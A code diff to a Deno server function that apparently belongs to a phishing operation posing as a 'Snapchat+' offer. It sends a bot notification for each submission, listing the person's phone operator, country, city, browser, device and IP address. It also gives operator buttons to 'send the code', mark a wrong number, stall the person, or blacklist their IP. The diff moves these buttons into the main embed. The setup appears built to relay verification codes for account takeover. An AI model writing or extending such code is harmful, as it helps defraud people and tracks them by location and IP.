@@ -42,6 +42,8 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
+  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
+
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -52,28 +54,20 @@ Deno.serve(async (req) => {
       { name: "🌍 Pays", value: finalCountry, inline: true },
       { name: "🏙️ Ville", value: finalCity, inline: true },
       { name: "🌐 Navigateur", value: finalBrowser, inline: true },
-      { name: "💾 Appareil", value: finalDevice, inline: true },
+      { name: "💾 Appareil", value: finalDevice, inline: false },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
+      {
+        name: "⚡ Actions",
+        value: `✅ [Envoyer le code](${appUrl}/action?trigger=${submissionId})\n❌ [Mauvais numéro](${appUrl}/action?action=wrong&id=${submissionId})\n⏳ [Faire patienter](${appUrl}/action?action=wait&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/action?action=blacklist&id=${submissionId}&ip=${finalIp})`,
+        inline: false,
+      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
-
-  const embed2 = {
-    fields: [
-      {
-        name: "⚡ Actions",
-        value: `✅ [Envoyer le code](${appUrl}/action?trigger=${submissionId})\n❌ [Mauvais numéro](${appUrl}/action?action=wrong&id=${submissionId})\n⏳ [Faire patienter](${appUrl}/action?action=wait&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/action?action=blacklist&id=${submissionId}&ip=${finalIp})`,
-        inline: false,
-      }
-    ],
-    color: operatorColors[operateur] || 16776960,
-  };
-
-  await sendBotMessage({ embeds: [embed, embed2] });
+  await sendBotMessage({ embeds: [embed] });
 
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
